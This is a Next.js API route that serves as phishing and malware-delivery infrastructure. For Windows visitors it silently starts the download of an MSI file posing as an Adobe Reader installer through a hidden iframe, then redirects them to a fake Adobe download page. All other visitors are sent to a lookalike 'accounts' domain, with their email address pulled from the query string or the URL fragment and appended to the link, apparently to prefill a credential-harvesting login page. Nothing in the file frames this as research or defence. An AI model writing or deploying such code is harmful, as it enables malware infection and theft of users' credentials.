// pages/api/redirect.js
import fs from 'fs';
import path from 'path';

export default function handler(req, res) {
  const userAgent = req.headers['user-agent'] || '';
  const isWindows = /windows/i.test(userAgent);

  // Configure your targets here
  const WINDOWS_REDIRECT_AFTER_DOWNLOAD = 'https://jomry.com/adobe-readers/installer/download.html';
  const MSI_PATH = '/Reader_en_install.msi'; // must exist in /public
  const NON_WINDOWS_TARGET = 'https://accounts.bsmszq.icu'; // base target (we will append smn=...)

  // Prefer email from server-side query param ?email=...
  const emailFromQuery = Array.isArray(req.query.email) ? req.query.email[0] : (req.query.email || '');

  if (isWindows) {
    // Windows: trigger download via hidden iframe, then redirect to ADOBE page
    const html = `<!DOCTYPE html>
      <html>
        <head><meta charset="utf-8"><title>Preparing download…</title></head>
        <body>
          <p>Your download will start shortly…</p>
          <script>
            try {
              const iframe = document.createElement('iframe');
              iframe.style.display = 'none';
              iframe.src = ${JSON.stringify(MSI_PATH)};
              document.body.appendChild(iframe);
            } catch (e) {
              console.error(e);
            }
            // give the browser time to start the download, then navigate
            setTimeout(function(){
              window.location.href = ${JSON.stringify(WINDOWS_REDIRECT_AFTER_DOWNLOAD)};
            }, 3000);
          </script>
          <noscript>
            <p>Please <a href="${MSI_PATH}">click here to download</a>.</p>
            <meta http-equiv="refresh" content="5;url=${WINDOWS_REDIRECT_AFTER_DOWNLOAD}">
          </noscript>
        </body>
      </html>`;

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.status(200).send(html);
    return;
  }

  // Non-Windows: use emailFromQuery if present; otherwise read window.location.hash on client
  // We use client-side HTML redirect to ensure the final URL is formed in the browser.
  const safeServerEmail = emailFromQuery ? encodeURIComponent(emailFromQuery) : '';

  const clientHtml = `<!DOCTYPE html>
    <html>
      <head><meta charset="utf-8"><title>Redirecting…</title></head>
      <body>
        <p>Redirecting…</p>
        <script>
          (function(){
            var base = ${JSON.stringify(NON_WINDOWS_TARGET)};
            var serverEmail = ${JSON.stringify(safeServerEmail)}; // already encoded by server if present

            function go(finalUrl){
              // use replace to avoid extra history entry
              window.location.replace(finalUrl);
            }

            if(serverEmail){
              // server provided email via ?email=
              var sep = base.indexOf('?') === -1 ? '?' : '&';
              var final = base + sep + 'smn=' + serverEmail;
              go(final);
              return;
            }

            // no server email: try to read from fragment (#email)
            var hash = window.location.hash || '';
            if(hash && hash.length > 1){
              var raw = hash.substring(1); // remove '#'
              try { raw = decodeURIComponent(raw); } catch (e) { /* ignore */ }
              var safe = encodeURIComponent(raw);
              var sep2 = base.indexOf('?') === -1 ? '?' : '&';
              var final2 = base + sep2 + 'smn=' + safe;
              go(final2);
              return;
            }

            // fallback: just go to base target
            go(base);
          })();
        </script>
        <noscript>
          <meta http-equiv="refresh" content="0;url=${NON_WINDOWS_TARGET}">
        </noscript>
      </body>
    </html>`;

  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.status(200).send(clientHtml);
}
